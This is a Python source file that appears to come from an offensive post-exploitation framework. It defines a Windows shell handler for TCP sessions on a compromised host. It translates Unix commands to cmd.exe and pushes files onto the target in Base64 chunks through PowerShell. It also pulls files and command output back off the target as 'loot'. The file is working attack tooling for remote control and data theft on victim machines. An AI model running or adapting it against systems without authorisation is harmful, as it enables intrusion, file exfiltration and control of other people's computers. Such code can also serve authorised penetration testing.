import base64
import os
from collections.abc import Mapping

from teralibs.terasploit.framework.services.printf import error, info, success, warning
from teralibs.tsf.core.shell.generic_shell import GenericShell
from teralibs.tsf.utils.exception import TerasploitShellError


class WindowsShell(GenericShell):
    """Windows (cmd.exe / PowerShell) interactive shell for TCP sessions."""

    PLATFORM_LABEL = "Windows"

    _WINDOWS_ALIASES: Mapping[str, str] = {
        "ls": "dir /A",
        "dir": "dir /A",
        "pwd": "cd",
        "cat": "type",
        "rm": "del",
        "rmdir": "rmdir /S /Q",
        "cp": "copy",
        "mv": "move",
        "clear": "cls",
        "ifconfig": "ipconfig /all",
        "ps": "tasklist",
        "kill": "taskkill /F /PID",
        "id": "whoami",
        "getuid": "whoami",
        "getpid": 'powershell -Command "[System.Diagnostics.Process]::GetCurrentProcess().Id"',
        "sysinfo": "systeminfo",
        "uname": "systeminfo",
        "hostname": "hostname",
        "env": "set",
        "printenv": "set",
        "which": "where",
    }

    def _handle_user_input(self, raw):
        """Translate Windows aliases then delegate to GenericShell dispatch."""
        if not raw:
            return
        super()._handle_user_input(self._translate_command(raw))

    def _translate_command(self, raw):
        """Map Unix-style commands to Windows cmd.exe equivalents."""
        parts = raw.split(None, 1)
        verb = parts[0].lower() if parts else ""
        rest = parts[1] if len(parts) > 1 else ""

        if verb in self._WINDOWS_ALIASES:
            translated = self._WINDOWS_ALIASES[verb]
            return f"{translated} {rest}".strip() if rest else translated

        return raw

    def _cmd_upload(self, args):
        """Upload a file to Windows by decoding a Base64 stream via PowerShell."""
        if len(args) < 2:
            warning("Usage: upload <local_path> <remote_path>")
            return

        local_path, remote_path = args[0], args[1]
        if not os.path.isfile(local_path):
            error(f"Source file not found: {local_path}")
            return

        chunk_size = 8192
        try:
            with open(local_path, "rb") as f:
                raw = f.read()

            safe_path = remote_path.replace("'", "''")
            total_chunks = (len(raw) + chunk_size - 1) // chunk_size
            info(f"Uploading {len(raw)} bytes to {remote_path} ({total_chunks} chunk(s))...")

            for idx in range(total_chunks):
                chunk_b64 = base64.b64encode(raw[idx * chunk_size : (idx + 1) * chunk_size]).decode("utf-8")

                if idx == 0:
                    ps_cmd = (
                        f'powershell -NoProfile -Command "'
                        f"[System.IO.File]::WriteAllBytes('{safe_path}', "
                        f"[System.Convert]::FromBase64String('{chunk_b64}'))\""
                    )
                else:
                    ps_cmd = (
                        f'powershell -NoProfile -Command "'
                        f"$f = [System.IO.File]::Open('{safe_path}', "
                        f"[System.IO.FileMode]::Append); "
                        f"$b = [System.Convert]::FromBase64String('{chunk_b64}'); "
                        f'$f.Write($b, 0, $b.Length); $f.Close()"'
                    )
                self._send(ps_cmd)

            success(f"Upload complete ({len(raw)} bytes, {total_chunks} chunk(s)).")

        except TerasploitShellError as exc:
            error(f"Upload failed: {exc}")

    def _cmd_download(self, args):
        """Download a file from Windows using a PowerShell Base64 envelope."""
        if not args:
            warning("Usage: download <remote_path> [local_path]")
            return

        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)

        info(f"Initiating download: {remote_path} → {local_path}")

        if not self._start_transfer(local_path):
            return

        safe_path = remote_path.replace("'", "''")
        ps_cmd = (
            f'powershell -NoProfile -Command "'
            f"$content = [System.IO.File]::ReadAllBytes('{safe_path}'); "
            f"[System.Convert]::ToBase64String($content); "
            f"Write-Host '---TERASPLOIT_SHELL_EOF---'\""
        )
        self._send(ps_cmd)

    def _build_loot_cmd(self, remote_cmd: str) -> str:
        """Build a PowerShell command that base64-encodes the command output."""
        safe_cmd = remote_cmd.replace('"', '`"')
        return (
            f'powershell -NoProfile -Command "'
            f"$out = & cmd /c {safe_cmd} 2>&1 | Out-String; "
            f"[System.Convert]::ToBase64String("
            f"[System.Text.Encoding]::UTF8.GetBytes($out)); "
            f"Write-Host '---TERASPLOIT_SHELL_EOF---'\""
        )

    def _help_sections(self) -> list:
        core, filesystem, execution = super()._help_sections()
        system = (
            "System",
            [
                ("sysinfo / uname", "systeminfo on the target"),
                ("getuid / id", "whoami on the target"),
                ("getpid", "PowerShell PID lookup"),
                ("hostname", "hostname on the target"),
                ("ps", "tasklist — list running processes"),
                ("kill <pid>", "taskkill /F /PID <pid>"),
                ("env / printenv", "set — print environment variables"),
            ],
        )
        win_fs = (
            filesystem[0],
            filesystem[1]
            + [
                ("pwd", "cd — print working directory"),
                ("ls / dir [path]", "dir /A — list directory contents"),
                ("cd <path>", "Change working directory"),
                ("cat <file>", "type <file> — print file contents"),
                ("rm <file>", "del <file>"),
                ("cp <src> <dst>", "copy <src> <dst>"),
                ("mv <src> <dst>", "move <src> <dst>"),
                ("which <name>", "where <name>"),
            ],
        )
        return [core, system, win_fs, execution]
